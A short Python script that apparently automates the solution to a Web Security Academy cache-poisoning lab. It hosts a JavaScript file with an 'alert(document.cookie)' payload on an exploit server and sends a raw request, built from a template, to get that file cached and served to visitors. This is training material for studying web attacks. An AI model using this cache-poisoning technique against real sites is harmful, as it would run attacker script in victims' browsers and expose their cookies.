from web_security_academy.core.logger import logger
from web_security_academy.core.utils import render_template_file

from urllib.parse import urlparse
from time import sleep


def solve_lab(session):
    exploit_server = session.exploit_server()
    exploit_server.craft_response(
        "/resources/js/tracking.js",
        "HTTP/1.1 200 OK\nContent-Type: application/javascript; charset=utf-8",
        "alert(document.cookie);",
    )

    logger.info("Sleeping for 30 seconds to clear cache...")
    sleep(30)

    req = render_template_file(
        "http.txt",
        session_hostname=urlparse(session.url).hostname,
        exploit_server_hostname=exploit_server.hostname,
        _lab=session.cookies["_lab"],
    ).replace("\n", "\r\n")

    session.send_raw(req.encode())
    session.get_path("/")
    logger.info("Sent and cached the following HTTP request:")
    print(req)

    logger.info("Sleeping for 30 seconds (waiting for user to visit home page)...")
    sleep(30)
